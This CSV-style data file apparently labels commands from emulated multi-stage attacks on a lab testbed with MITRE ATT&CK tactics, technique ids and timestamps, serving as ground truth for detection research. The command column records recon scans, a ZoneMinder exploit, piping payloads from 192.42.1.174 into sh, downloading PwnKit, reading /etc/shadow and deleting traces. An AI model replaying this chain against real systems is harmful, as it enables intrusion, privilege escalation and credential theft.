scenario;tactics;techniques;technique_names;event_id;cmd;start;end
1_autostart_localaccount;execution;T1059;NA;18;export_SHELL_bash;1758567293.664227;1758567301.0
1_autostart_localaccount;execution;T1059;NA;19;export_TERM_xterm256_color;1758567310.026968;1758567317.0
1_autostart_localaccount;discovery;T1033;NA;20;id;1758567342.719818;1758567350.0
1_autostart_localaccount;command-and-controlpersistence;T1105_T1136.001;NA;21;curl_http___192_42_1_174_README_txt_3___sh;1758567359.049038;1758567406.0
1_autostart_localaccount;discovery;T1033;NA;22;id;1758567415.427142;1758567451.0
1_autostart_localaccount;discovery;T1033;NA;23;id;1758567493.412428;1758567500.0
1_autostart_localaccount;credential-access;T1003.008;NA;24;cat__etc_shadow;1758567524.027074;1758567530.0
1_autostart_localaccount;discovery;T1120;NA;25;lspci;1758567539.062841;1758567545.0
1_autostart_localaccount;discovery;T1120;NA;26;command__v_lsusb;1758567554.114909;1758567560.0
1_autostart_localaccount;discovery;T1124;NA;27;date;1758567569.150533;1758567575.0
1_autostart_localaccount;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1758567584.165877;1758567621.0
1_autostart_pam;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1760439542.218696;1760439553.0
1_autostart_pam;reconnaissancereconnaissance;T1595_T1592.002;NA;2;nmap__O__sT___top_ports_100_video_attackbed_com;1760439562.193735;1760439581.0
1_autostart_pam;reconnaissance;T1595.002;NA;3;nikto__host_video_attackbed_com;1760439590.361274;1760439641.0
1_autostart_pam;reconnaissance;T1595.003;NA;4;ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ;1760439650.045543;1760439757.0
1_autostart_pam;initial-accessexecution;T1190_T1059.006;NA;5;exploit_unix_webapp_zoneminder_snapshots;1760439767.012362;1760439824.0
1_autostart_pam;command-and-control;T1105;NA;6;upload__var_www_html_linpeas_sh;1760439849.797714;1760439857.0
1_autostart_pam;execution;T1059;NA;7;python3__c__import_pty_pty_spawn___bash_____;1760439882.528908;1760439889.0
1_autostart_pam;execution;T1059;NA;8;export_SHELL_bash;1760439898.894251;1760439906.0
1_autostart_pam;execution;T1059;NA;9;export_TERM_xterm256_color;1760439915.263798;1760439922.0
1_autostart_pam;execution;T1059;NA;10;stty_rows_38_columns_116;1760439931.584869;1760439938.0
1_autostart_pam;execution;T1059;NA;11;export_PS1__PWN__;1760439947.913433;1760439955.0
1_autostart_pam;execution;T1059;NA;12;chmod__x_linpeas_sh;1760439964.235829;1760439971.0
1_autostart_pam;discoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscovery;T1087_T1083_T1201_T1069_T1057_T1518_T1082_T1614_T1016_T1049_T1033_T1007_T1615;NA;13;__linpeas_sh__s__q__N_2___dev_null;1760439980.600887;1760440587.0
1_autostart_pam;discovery;T1033;NA;14;id;1760440596.827676;1760440603.0
1_autostart_pam;persistence_privilege-escalation;T1547;NA;15;ExecStartPre_bash__var_www_default__zm_preload_sh__;1760440611.814637;1760440701.0
1_autostart_pam;persistence_privilege-escalation;T1547;NA;16;_wq__;1760440726.400059;1760441006.0
1_autostart_pam;execution;T1059;NA;17;python3__c__import_pty_pty_spawn___bash_____;1760441046.895463;1760441054.0
1_autostart_pam;execution;T1059;NA;18;export_SHELL_bash;1760441063.257378;1760441070.0
1_autostart_pam;execution;T1059;NA;19;export_TERM_xterm256_color;1760441079.623306;1760441086.0
1_autostart_pam;discovery;T1033;NA;20;id;1760441112.347356;1760441119.0
1_autostart_pam;command-and-controlcredential-access_defense-evasion_persistence;T1105_T1556.003;NA;29;curl_http___192_42_1_174_README_txt_5___sh;1760441128.663199;1760441175.0
1_autostart_pam;discovery;T1033;NA;22;id;1760441184.886474;1760441221.0
1_autostart_pam;discovery;T1033;NA;23;id;1760441262.858557;1760441269.0
1_autostart_pam;credential-access;T1003.008;NA;24;cat__etc_shadow;1760441293.191898;1760441299.0
1_autostart_pam;discovery;T1120;NA;25;lspci;1760441308.225298;1760441314.0
1_autostart_pam;discovery;T1120;NA;26;command__v_lsusb;1760441323.301141;1760441329.0
1_autostart_pam;discovery;T1124;NA;27;date;1760441338.336422;1760441344.0
1_autostart_pam;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1760441353.355944;1760441390.0
1_autostart_sshkey;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1758558515.47398;1758558525.0
1_autostart_sshkey;reconnaissancereconnaissance;T1595_T1592.002;NA;2;nmap__O__sT___top_ports_100_video_attackbed_com;1758558534.083458;1758558553.0
1_autostart_sshkey;reconnaissance;T1595.002;NA;3;nikto__host_video_attackbed_com;1758558562.191877;1758558612.0
1_autostart_sshkey;reconnaissance;T1595.003;NA;4;ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ;1758558621.334618;1758558722.0
1_autostart_sshkey;initial-accessexecution;T1190_T1059.006;NA;5;exploit_unix_webapp_zoneminder_snapshots;1758558731.856775;1758558790.0
1_autostart_sshkey;command-and-control;T1105;NA;6;upload__var_www_html_linpeas_sh;1758558816.564336;1758558823.0
1_autostart_sshkey;execution;T1059;NA;7;python3__c__import_pty_pty_spawn___bash_____;1758558849.220688;1758558856.0
1_autostart_sshkey;execution;T1059;NA;8;export_SHELL_bash;1758558865.593958;1758558872.0
1_autostart_sshkey;execution;T1059;NA;9;export_TERM_xterm256_color;1758558881.927972;1758558889.0
1_autostart_sshkey;execution;T1059;NA;10;stty_rows_38_columns_116;1758558898.305928;1758558905.0
1_autostart_sshkey;execution;T1059;NA;11;export_PS1__PWN__;1758558914.631138;1758558922.0
1_autostart_sshkey;execution;T1059;NA;12;chmod__x_linpeas_sh;1758558931.019452;1758558938.0
1_autostart_sshkey;discoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscovery;T1087_T1083_T1201_T1069_T1057_T1518_T1082_T1614_T1016_T1049_T1033_T1007_T1615;NA;13;__linpeas_sh__s__q__N_2___dev_null;1758558947.343927;1758559554.0
1_autostart_sshkey;discovery;T1033;NA;14;id;1758559563.676818;1758559569.0
1_autostart_sshkey;persistence_privilege-escalation;T1547;NA;15;ExecStartPre_bash__var_www_default__zm_preload_sh__;1758559578.337478;1758559667.0
1_autostart_sshkey;persistence_privilege-escalation;T1547;NA;16;_wq__;1758559692.991807;1758559973.0
1_autostart_sshkey;execution;T1059;NA;17;python3__c__import_pty_pty_spawn___bash_____;1758560012.031794;1758560019.0
1_autostart_sshkey;execution;T1059;NA;18;export_SHELL_bash;1758560028.354539;1758560035.0
1_autostart_sshkey;execution;T1059;NA;19;export_TERM_xterm256_color;1758560044.720304;1758560052.0
1_autostart_sshkey;discovery;T1033;NA;20;id;1758560077.291825;1758560084.0
1_autostart_sshkey;command-and-controlpersistence_privilege-escalation;T1105_T1098.004;NA;30;curl_http___192_42_1_174_README_txt_1___sh;1758560093.623758;1758560140.0
1_autostart_sshkey;discovery;T1033;NA;22;id;1758560149.859397;1758560186.0
1_autostart_sshkey;discovery;T1033;NA;23;id;1758560227.815632;1758560234.0
1_autostart_sshkey;credential-access;T1003.008;NA;24;cat__etc_shadow;1758560258.441132;1758560264.0
1_autostart_sshkey;discovery;T1120;NA;25;lspci;1758560273.466573;1758560279.0
1_autostart_sshkey;discovery;T1120;NA;26;command__v_lsusb;1758560288.505728;1758560294.0
1_autostart_sshkey;discovery;T1124;NA;27;date;1758560303.527048;1758560309.0
1_autostart_sshkey;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1758560318.546037;1758560355.0
1_cron_localaccount;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1758700071.088648;1758700080.0
1_cron_localaccount;reconnaissancereconnaissance;T1595_T1592.002;NA;2;nmap__O__sT___top_ports_100_video_attackbed_com;1758700089.943382;1758700109.0
1_cron_localaccount;reconnaissance;T1595.002;NA;3;nikto__host_video_attackbed_com;1758700118.067485;1758700167.0
1_cron_localaccount;reconnaissance;T1595.003;NA;4;ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ;1758700176.350609;1758700278.0
1_cron_localaccount;initial-accessexecution;T1190_T1059.006;NA;5;exploit_unix_webapp_zoneminder_snapshots;1758700287.739511;1758700340.0
1_cron_localaccount;command-and-control;T1105;NA;6;upload__var_www_html_linpeas_sh;1758700365.901191;1758700373.0
1_cron_localaccount;execution;T1059;NA;7;python3__c__import_pty_pty_spawn___bash_____;1758700398.6523;1758700406.0
1_cron_localaccount;execution;T1059;NA;8;export_SHELL_bash;1758700415.028234;1758700422.0
1_cron_localaccount;execution;T1059;NA;9;export_TERM_xterm256_color;1758700431.340381;1758700438.0
1_cron_localaccount;execution;T1059;NA;10;stty_rows_38_columns_116;1758700447.67948;1758700454.0
1_cron_localaccount;execution;T1059;NA;11;export_PS1__PWN__;1758700463.954617;1758700471.0
1_cron_localaccount;execution;T1059;NA;12;chmod__x_linpeas_sh;1758700480.313524;1758700487.0
1_cron_localaccount;discoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscovery;T1087_T1083_T1201_T1069_T1057_T1518_T1082_T1614_T1016_T1049_T1033_T1007_T1615;NA;13;__linpeas_sh__s__q__N_2___dev_null;1758700496.593532;1758701103.0
1_cron_localaccount;discovery;T1033;NA;14;id;1758701112.968285;1758701119.0
1_cron_localaccount;execution_persistence_privilege-escalation;T1053;NA;31;curl_http___192_42_1_174_TODO_md___sh;1758701177.200166;1758701184.0
1_cron_localaccount;execution_persistence_privilege-escalation;T1053;NA;32;_wq__;1758701209.948255;1758701765.0
1_cron_localaccount;execution;T1059;NA;17;python3__c__import_pty_pty_spawn___bash_____;1758701777.714727;1758701785.0
1_cron_localaccount;execution;T1059;NA;18;export_SHELL_bash;1758701794.07346;1758701801.0
1_cron_localaccount;execution;T1059;NA;19;export_TERM_xterm256_color;1758701810.37921;1758701817.0
1_cron_localaccount;execution;T1059;NA;33;stty_rows_38_columns_116;1758701826.607743;1758701833.0
1_cron_localaccount;discovery;T1033;NA;20;id;1758701842.877328;1758701850.0
1_cron_localaccount;command-and-controlpersistence;T1105_T1136.001;NA;21;curl_http___192_42_1_174_README_txt_3___sh;1758701859.246357;1758701906.0
1_cron_localaccount;discovery;T1033;NA;22;id;1758701915.603331;1758701921.0
1_cron_localaccount;defense-evasion;T1070.004;NA;34;rm;1758701930.886304;1758701968.0
1_cron_localaccount;discovery;T1033;NA;23;id;1758702009.720115;1758702016.0
1_cron_localaccount;credential-access;T1003.008;NA;24;cat__etc_shadow;1758702040.330566;1758702046.0
1_cron_localaccount;discovery;T1120;NA;25;lspci;1758702055.360967;1758702061.0
1_cron_localaccount;discovery;T1120;NA;26;command__v_lsusb;1758702070.406403;1758702076.0
1_cron_localaccount;discovery;T1124;NA;27;date;1758702085.431643;1758702091.0
1_cron_localaccount;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1758702100.45333;1758702136.0
1_cron_pam;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1758704429.296482;1758704439.0
1_cron_pam;reconnaissancereconnaissance;T1595_T1592.002;NA;2;nmap__O__sT___top_ports_100_video_attackbed_com;1758704448.14373;1758704467.0
1_cron_pam;reconnaissance;T1595.002;NA;3;nikto__host_video_attackbed_com;1758704476.231927;1758704525.0
1_cron_pam;reconnaissance;T1595.003;NA;4;ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ;1758704534.695572;1758704636.0
1_cron_pam;initial-accessexecution;T1190_T1059.006;NA;5;exploit_unix_webapp_zoneminder_snapshots;1758704645.803675;1758704698.0
1_cron_pam;command-and-control;T1105;NA;6;upload__var_www_html_linpeas_sh;1758704724.333426;1758704731.0
1_cron_pam;execution;T1059;NA;7;python3__c__import_pty_pty_spawn___bash_____;1758704757.066103;1758704764.0
1_cron_pam;execution;T1059;NA;8;export_SHELL_bash;1758704773.42067;1758704780.0
1_cron_pam;execution;T1059;NA;9;export_TERM_xterm256_color;1758704789.733476;1758704797.0
1_cron_pam;execution;T1059;NA;10;stty_rows_38_columns_116;1758704806.098233;1758704813.0
1_cron_pam;execution;T1059;NA;11;export_PS1__PWN__;1758704822.460289;1758704829.0
1_cron_pam;execution;T1059;NA;12;chmod__x_linpeas_sh;1758704838.78171;1758704846.0
1_cron_pam;discoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscovery;T1087_T1083_T1201_T1069_T1057_T1518_T1082_T1614_T1016_T1049_T1033_T1007_T1615;NA;13;__linpeas_sh__s__q__N_2___dev_null;1758704855.151505;1758705462.0
1_cron_pam;discovery;T1033;NA;14;id;1758705471.447914;1758705477.0
1_cron_pam;execution_persistence_privilege-escalation;T1053;NA;31;curl_http___192_42_1_174_TODO_md___sh;1758705535.665903;1758705542.0
1_cron_pam;execution_persistence_privilege-escalation;T1053;NA;32;_wq__;1758705568.283557;1758706270.0
1_cron_pam;execution;T1059;NA;17;python3__c__import_pty_pty_spawn___bash_____;1758706277.965469;1758706285.0
1_cron_pam;execution;T1059;NA;18;export_SHELL_bash;1758706294.316403;1758706301.0
1_cron_pam;execution;T1059;NA;19;export_TERM_xterm256_color;1758706310.677588;1758706318.0
1_cron_pam;execution;T1059;NA;33;stty_rows_38_columns_116;1758706327.050865;1758706334.0
1_cron_pam;discovery;T1033;NA;20;id;1758706343.411938;1758706350.0
1_cron_pam;command-and-controlcredential-access_defense-evasion_persistence;T1105_T1556.003;NA;29;curl_http___192_42_1_174_README_txt_5___sh;1758706359.63053;1758706406.0
1_cron_pam;discovery;T1033;NA;22;id;1758706415.99591;1758706422.0
1_cron_pam;defense-evasion;T1070.004;NA;34;rm;1758706431.26469;1758706468.0
1_cron_pam;discovery;T1033;NA;23;id;1758706510.347509;1758706516.0
1_cron_pam;credential-access;T1003.008;NA;24;cat__etc_shadow;1758706540.603852;1758706546.0
1_cron_pam;discovery;T1120;NA;25;lspci;1758706555.638642;1758706561.0
1_cron_pam;discovery;T1120;NA;26;command__v_lsusb;1758706570.688956;1758706576.0
1_cron_pam;discovery;T1124;NA;27;date;1758706585.720285;1758706591.0
1_cron_pam;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1758706600.738108;1758706636.0
1_cron_sshkey;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1758694711.081011;1758694720.0
1_cron_sshkey;reconnaissancereconnaissance;T1595_T1592.002;NA;2;nmap__O__sT___top_ports_100_video_attackbed_com;1758694729.98692;1758694749.0
1_cron_sshkey;reconnaissance;T1595.002;NA;3;nikto__host_video_attackbed_com;1758694758.120949;1758694808.0
1_cron_sshkey;reconnaissance;T1595.003;NA;4;ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ;1758694817.128538;1758694919.0
1_cron_sshkey;initial-accessexecution;T1190_T1059.006;NA;5;exploit_unix_webapp_zoneminder_snapshots;1758694928.20068;1758694985.0
1_cron_sshkey;command-and-control;T1105;NA;6;upload__var_www_html_linpeas_sh;1758695010.591283;1758695017.0
1_cron_sshkey;execution;T1059;NA;7;python3__c__import_pty_pty_spawn___bash_____;1758695043.199902;1758695050.0
1_cron_sshkey;execution;T1059;NA;8;export_SHELL_bash;1758695059.567678;1758695066.0
1_cron_sshkey;execution;T1059;NA;9;export_TERM_xterm256_color;1758695075.785453;1758695083.0
1_cron_sshkey;execution;T1059;NA;10;stty_rows_38_columns_116;1758695092.156268;1758695099.0
1_cron_sshkey;execution;T1059;NA;11;export_PS1__PWN__;1758695108.518004;1758695115.0
1_cron_sshkey;execution;T1059;NA;12;chmod__x_linpeas_sh;1758695124.864309;1758695132.0
1_cron_sshkey;discoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscovery;T1087_T1083_T1201_T1069_T1057_T1518_T1082_T1614_T1016_T1049_T1033_T1007_T1615;NA;13;__linpeas_sh__s__q__N_2___dev_null;1758695141.228631;1758695748.0
1_cron_sshkey;discovery;T1033;NA;14;id;1758695757.605687;1758695763.0
1_cron_sshkey;execution_persistence_privilege-escalation;T1053;NA;31;curl_http___192_42_1_174_TODO_md___sh;1758695821.874229;1758695829.0
1_cron_sshkey;execution_persistence_privilege-escalation;T1053;NA;32;_wq__;1758695854.466512;1758696365.0
1_cron_sshkey;execution;T1059;NA;17;python3__c__import_pty_pty_spawn___bash_____;1758696376.832543;1758696384.0
1_cron_sshkey;execution;T1059;NA;18;export_SHELL_bash;1758696393.14249;1758696400.0
1_cron_sshkey;execution;T1059;NA;19;export_TERM_xterm256_color;1758696409.508057;1758696416.0
1_cron_sshkey;execution;T1059;NA;33;stty_rows_38_columns_116;1758696425.691962;1758696433.0
1_cron_sshkey;discovery;T1033;NA;20;id;1758696442.061722;1758696449.0
1_cron_sshkey;command-and-controlpersistence_privilege-escalation;T1105_T1098.004;NA;30;curl_http___192_42_1_174_README_txt_1___sh;1758696458.295256;1758696505.0
1_cron_sshkey;discovery;T1033;NA;22;id;1758696514.656273;1758696520.0
1_cron_sshkey;defense-evasion;T1070.004;NA;34;rm;1758696529.926793;1758696567.0
1_cron_sshkey;discovery;T1033;NA;23;id;1758696608.875684;1758696615.0
1_cron_sshkey;credential-access;T1003.008;NA;24;cat__etc_shadow;1758696639.476925;1758696645.0
1_cron_sshkey;discovery;T1120;NA;25;lspci;1758696654.488588;1758696660.0
1_cron_sshkey;discovery;T1120;NA;26;command__v_lsusb;1758696669.535761;1758696675.0
1_cron_sshkey;discovery;T1124;NA;27;date;1758696684.55363;1758696690.0
1_cron_sshkey;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1758696699.570745;1758696735.0
1_pwnkit_localaccount;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1758522316.316672;1758522327.0
1_pwnkit_localaccount;reconnaissancereconnaissance;T1595_T1592.002;NA;2;nmap__O__sT___top_ports_100_video_attackbed_com;1758522336.167729;1758522355.0
1_pwnkit_localaccount;reconnaissance;T1595.002;NA;3;nikto__host_video_attackbed_com;1758522364.28209;1758522414.0
1_pwnkit_localaccount;reconnaissance;T1595.003;NA;4;ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ;1758522423.635242;1758522525.0
1_pwnkit_localaccount;initial-accessexecution;T1190_T1059.006;NA;5;exploit_unix_webapp_zoneminder_snapshots;1758522534.922878;1758522586.0
1_pwnkit_localaccount;command-and-control;T1105;NA;6;upload__var_www_html_linpeas_sh;1758522611.979386;1758522619.0
1_pwnkit_localaccount;execution;T1059;NA;7;python3__c__import_pty_pty_spawn___bash_____;1758522644.620207;1758522651.0
1_pwnkit_localaccount;execution;T1059;NA;8;export_SHELL_bash;1758522660.936172;1758522668.0
1_pwnkit_localaccount;execution;T1059;NA;9;export_TERM_xterm256_color;1758522677.295627;1758522684.0
1_pwnkit_localaccount;execution;T1059;NA;10;stty_rows_38_columns_116;1758522693.527068;1758522700.0
1_pwnkit_localaccount;execution;T1059;NA;11;export_PS1__PWN__;1758522709.892549;1758522717.0
1_pwnkit_localaccount;execution;T1059;NA;12;chmod__x_linpeas_sh;1758522726.168701;1758522733.0
1_pwnkit_localaccount;discoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscovery;T1087_T1083_T1201_T1069_T1057_T1518_T1082_T1614_T1016_T1049_T1033_T1007_T1615;NA;13;__linpeas_sh__s__q__N_2___dev_null;1758522742.540556;1758523348.0
1_pwnkit_localaccount;discovery;T1033;NA;14;id;1758523357.739515;1758523363.0
1_pwnkit_localaccount;command-and-control;T1105;NA;35;wget_http___192_42_1_174_PwnKit____dev_null_2__1;1758523372.982571;1758523380.0
1_pwnkit_localaccount;privilege-escalation;T1068;NA;36;chmod__x_PwnKit______PwnKit;1758523389.352215;1758523396.0
1_pwnkit_localaccount;discovery;T1033;NA;37;id;1758523405.675744;1758523413.0
1_pwnkit_localaccount;command-and-controlpersistence;T1105_T1136.001;NA;38;cd__root__wget__O_README_txt_http___192_42_1_174_README_txt_2;1758523422.042352;1758523429.0
1_pwnkit_localaccount;defense-evasionpersistence;T1218_T1136.001;NA;39;split___filter__cat__FILE___xargs_bash__c____C_2000_README_txt;1758523438.346057;1758523445.0
1_pwnkit_localaccount;defense-evasion;T1070.004;NA;40;rm;1758523454.669295;1758523462.0
1_pwnkit_localaccount;defense-evasion;T1070.004;NA;40;rm;1758523487.322861;1758523494.0
1_pwnkit_localaccount;defense-evasion;T1070.004;NA;40;rm;1758523503.691912;1758523540.0
1_pwnkit_localaccount;discovery;T1033;NA;23;id;1758523566.351938;1758523572.0
1_pwnkit_localaccount;credential-access;T1003.008;NA;24;cat__etc_shadow;1758523596.96158;1758523602.0
1_pwnkit_localaccount;discovery;T1120;NA;25;lspci;1758523611.996878;1758523618.0
1_pwnkit_localaccount;discovery;T1120;NA;26;command__v_lsusb;1758523627.048434;1758523633.0
1_pwnkit_localaccount;discovery;T1124;NA;27;date;1758523642.083046;1758523648.0
1_pwnkit_localaccount;defense-evasion_discovery;T1497.001;NA;28;find__usr__name___virtualbox__;1758523657.098431;1758523693.0
1_pwnkit_pam;reconnaissancereconnaissance;T1590.002_T1591;NA;1;dnsenum__f__usr_local_share_SecLists_Discovery_DNS_subdomains_top1million_5000_txt___dnsserver_192_42_0_233_attackbed_com;1758526963.396871;1758526973.0
1_pwnkit_pam;reconnaissancereconnaissance;T1595_T1592.002;NA;2;nmap__O__sT___top_ports_100_video_attackbed_com;1758526982.181244;1758527001.0
1_pwnkit_pam;reconnaissance;T1595.002;NA;3;nikto__host_video_attackbed_com;1758527010.309994;1758527060.0
1_pwnkit_pam;reconnaissance;T1595.003;NA;4;ffuf__w__usr_local_share_SecLists_Discovery_Web_Content_raft_small_directories_lowercase_txt__u_http___video_attackbed_com_FUZZ;1758527069.971594;1758527171.0
1_pwnkit_pam;initial-accessexecution;T1190_T1059.006;NA;5;exploit_unix_webapp_zoneminder_snapshots;1758527180.887096;1758527234.0
1_pwnkit_pam;command-and-control;T1105;NA;6;upload__var_www_html_linpeas_sh;1758527259.778993;1758527267.0
1_pwnkit_pam;execution;T1059;NA;7;python3__c__import_pty_pty_spawn___bash_____;1758527292.495705;1758527299.0
1_pwnkit_pam;execution;T1059;NA;8;export_SHELL_bash;1758527308.861674;1758527316.0
1_pwnkit_pam;execution;T1059;NA;9;export_TERM_xterm256_color;1758527325.216098;1758527332.0
1_pwnkit_pam;execution;T1059;NA;10;stty_rows_38_columns_116;1758527341.409998;1758527348.0
1_pwnkit_pam;execution;T1059;NA;11;export_PS1__PWN__;1758527357.770718;1758527365.0
1_pwnkit_pam;execution;T1059;NA;12;chmod__x_linpeas_sh;1758527374.077296;1758527381.0
1_pwnkit_pam;discoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscoverydiscovery;T1087_T1083_T1201_T1069_T1057_T1518_T1082_T1614_T1016_T1049_T1033_T1007_T1615;NA;13;__linpeas_sh__s__q__N_2___dev_null;1758527390.392265;1758527996.0
1_pwnkit_pam;discovery;T1033;NA;14;id;1758528005.57235;1758528011.0
1_pwnkit_pam;command-and-control;T1105;NA;35;wget_http___192_42_1_174_PwnKit____dev_null_2__1;1758528020.761762;1758528028.0
1_pwnkit_pam;privilege-escalation;T1068;NA;36;chmod__x_PwnKit______PwnKit;1758528037.126957;1758528044.0
1_pwnkit_pam;discovery;T1033;NA;37;id;1758528053.441452;1758528060.0
1_pwnkit_pam;command-and-controlcredential-access_defense-evasion_persistence;T1105_T1556.003;NA;41;cd__root__wget__O_README_txt_http___192_42_1_174_README_txt_4;1758528069.804766;1758528077.0
1_pwnkit_pam;defense-evasioncredential-access_defense-evasion_persistence;T1218_T1556.003;NA;42;split___filter__cat__FILE___xargs_bash__c____C_2000_README_txt;1758528086.12594;1758528093.0
1_pwnkit_pam;defense-evasion;T1070.004;NA;40;rm;1758528102.405069;1758528109.0
1_pwnkit_pam;defense-evasion;T1070.004;NA;40;rm;1758528135.096738;1758528142.0
